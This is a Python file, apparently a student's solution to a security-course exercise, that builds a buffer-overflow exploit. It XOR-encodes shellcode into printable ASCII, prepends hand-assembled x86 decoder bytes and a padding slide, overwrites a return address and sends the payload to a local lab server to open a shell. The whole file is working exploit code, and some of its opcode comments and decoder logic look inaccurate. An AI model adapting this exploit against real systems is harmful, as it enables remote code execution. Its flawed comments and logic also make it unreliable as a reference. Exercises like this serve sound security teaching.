import functools
import os
import socket
import traceback
import q2
import sys
import struct

from infosec.core import assemble, smoke
from typing import Tuple, Iterable


HOST = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT = 1337


ASCII_MAX = 0x7f


def warn_invalid_ascii(selector=None):
    selector = selector or (lambda x: x)

    def decorator(func):
        @functools.wraps(func)
        def result(*args, **kwargs):
            ret = func(*args, **kwargs)
            if any(c > ASCII_MAX for c in selector(ret)):
                smoke.warning(f'Non ASCII chars in return value from '
                              f'{func.__name__} at '
                              f'{"".join(traceback.format_stack()[:-1])}')
            return ret
        return result
    return decorator


def get_raw_shellcode():
    return q2.get_shellcode()


@warn_invalid_ascii(lambda result: result[0])
def encode(data: bytes) -> Tuple[bytes, Iterable[int]]:
    """Encode the given data to be valid ASCII.

    As we recommended in the exercise, the easiest way would be to XOR
    non-ASCII bytes with 0xff, and have this function return the encoded data
    and the indices that were XOR-ed.

    Tips:
    1. To return multiple values, do `return a, b`

    Args:
        data - The data to encode

    Returns:
        A tuple of [the encoded data, the indices that need decoding]
    """
    mask = 0xff
    encoded_bytes = []
    endoded_indexes = []
    for i in range(len(data)):
        byte = data[i]
        if byte > ASCII_MAX:          # if not leagal ASCII byte, byte = byte XOR mask
            byte = byte ^ mask 
            encoded_bytes.append(byte)
            endoded_indexes.append(i) # store the index of the bytes we used the mask
        else:                         # if leagal ASCII byte
            encoded_bytes.append(byte)

    return (bytes(encoded_bytes),endoded_indexes)



@warn_invalid_ascii()
def get_decoder_code(indices: Iterable[int]) -> bytes:
    """This function returns the machine code (bytes) of the decoder code.

    In this question, the "decoder code" should be the code which decodes the
    encoded shellcode so that we can properly execute it. Assume you already
    have the address of the shellcode, and all you need to do here is to do the
    decoding.

    Args:
        indices - The indices of the shellcode that need the decoding (as
        returned from `encode`)

    Returns:
         The decoder coder (assembled, as bytes)
    """
    decoder = b'\x6a\x00\x5b\x4b' # EBX = 0xFF
    decoder += b'\x6a\x00\x59'    
    ecx_inc = b'\x67'             # x67 = CMP
    
    xor_res = b'\x30\x1c\x08'     # XOR BYTE PTR [EAX + ECX], BL
    for i in range(len(indices)):
        if i<len(indices)-1:
            times_to_inc    = indices[i+1] - indices[i]
            decoder += ecx_inc * times_to_inc
        decoder += xor_res
    return decoder
    

@warn_invalid_ascii()
def get_ascii_shellcode() -> bytes:
    """This function returns the machine code (bytes) of the shellcode.

    In this question, the "shellcode" should be the code which if we put EIP to
    point at, it will open the shell. Since we need this shellcode to be
    entirely valid ASCII, the "shellcode" is made of the following:

    - The instructions needed to find the address of the encoded shellcode
    - The encoded shellcode, which is just the shellcode from q2 after encoding
      it using the `encode()` function we defined above
    - The decoder code needed to extract the encoded shellcode

    As before, this does not include the size of the message sent to the server,
    the return address we override, the nop slide or anything else!

    Tips:
    1. This function is for your convenience, and will not be tested directly.
       Feel free to modify it's parameters as needed.
    2. Use the `assemble` module to translate any additional instructions into
       bytes.

    Returns:
         The bytes of the shellcode.
    """
    q2_shellcode = get_raw_shellcode()
    length = len(q2_shellcode) + 4
    decoder = b'\x54\x58' + b'\x67'*length # PUSH EIP; POP EAX; SUB EAX, len_shellcode (CMP slide).
    
    encoded_shell, indices  = encode(q2_shellcode)
    decoder += get_decoder_code(indices)
    decoder += encoded_shell

    return decoder
    
    
@warn_invalid_ascii(lambda payload: payload[4:-5])
def get_payload() -> bytes:
    """This function returns the data to send over the socket to the server.

    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode, the return address (and the zero at the end).

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the payload.
    """
    # 1044 = buffer length, 1040 = message length, 0xbfffdcac - buffer start address
    return struct.pack('>i', 1044) + get_ascii_shellcode().rjust(1040, b'\x67') + struct.pack('<I', 0xbfffdcac)
    

def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
